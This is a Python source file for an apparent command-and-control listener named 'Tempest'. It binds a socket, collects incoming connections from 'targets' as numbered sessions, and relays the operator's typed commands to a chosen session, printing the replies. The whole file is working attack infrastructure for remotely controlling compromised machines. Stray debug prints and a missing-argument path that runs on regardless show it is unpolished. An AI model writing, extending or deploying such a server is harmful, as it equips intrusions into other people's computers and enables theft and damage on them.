import socket
import sys
import threading

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(bcolors.HEADER + '=============================================' + bcolors.ENDC)
    print(bcolors.HEADER + ' _____  _____ _      ____  _____ ____  _____ ' + bcolors.ENDC)
    print(bcolors.HEADER + '/__ __\/  __// \__/|/  __\/  __// ___\/__ __\\' + bcolors.ENDC)
    print(bcolors.HEADER + '  / \  |  \  | |\/|||  \/||  \  |    \  / \  ' + bcolors.ENDC)
    print(bcolors.HEADER + '  | |  |  /_ | |  |||  __/|  /_ \___ |  | |  ' + bcolors.ENDC)
    print(bcolors.HEADER + '  \_/  \____\\\\_/  \|\_/   \____\\\\____/  \_/  ' + bcolors.ENDC)
    print(bcolors.HEADER + bcolors.BOLD + '\nBy HK Transfield' + bcolors.ENDC)
    print(bcolors.HEADER + '=============================================\n' + bcolors.ENDC)

def comm_in(target_id):
    """
    This function handles all the responses sent from the sockclient
    back to the sockserver.
    """
    print('[+] Awaiting response...')
    response = target_id.recv(1024).decode()
    return response

def comm_out(target_id, message):
    """
    This function sends commands from the sock server to the sockclient.
    """
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id):
    """
    Manages the command and traffic control.
    """
    while True:
        message = input('[*] Message to send > ')
        comm_out(target_id, message)
        if message == 'exit':
            target_id.send(message.encode())
            target_id.close()
            break
        if message == 'background':
            break

        else:
            response = comm_in(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session')
                target_id.close()
                break
            print(response)

def listener_handler():
    """
    This function hosts the listener for the socket, binds the socket, accepts
    traffic, and then redirects that traffic.
    """

    # 1 Accept Connection
    sock.bind((host_ip, host_port))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target = comm_handler)
    t1.start()

def comm_handler():
    """
    This function directs traffic to where it needs to go and ensures that it is
    receiving it where needed.
    """
    while True:
        print('HIIIIIIIIIII')
        if kill_flag == 1:
            print('OHHHH NOOOOO')
            break
        try:
            remote_target, remote_ip = sock.accept()
            targets.append([remote_target, remote_ip[0]])
            print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command >',end='')
        except:
            pass

if __name__ == '__main__':
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
    except IndexError:
        print('[-] Command line argument(s) missing. Please try again')
        print('[-] Usage: python sockserver.py [host IP] [host Port]')
    except Exception as e:
        print(e)
    listener_handler()

    while True:
        try:
            command = input('[*] Enter command > ')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0

                # list sessions
                if command.split(" ")[1] == '-l':
                    print(bcolors.UNDERLINE + bcolors.BOLD + '\nSession' + ' ' * 10 + 'Target' + bcolors.ENDC)
                    for target in targets:
                        print(str(session_counter) + ' ' * 16 + target[1])
                        session_counter += 1

                # interact with individual sessions
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    target_id = (targets[num])[0]
                    target_comm(target_id)

        except KeyboardInterrupt:
            print(bcolors.WARNING + '\n[+] Keyboard interrupt issued.' + bcolors.ENDC)
            kill_flag = 1
            sock.close()
            break

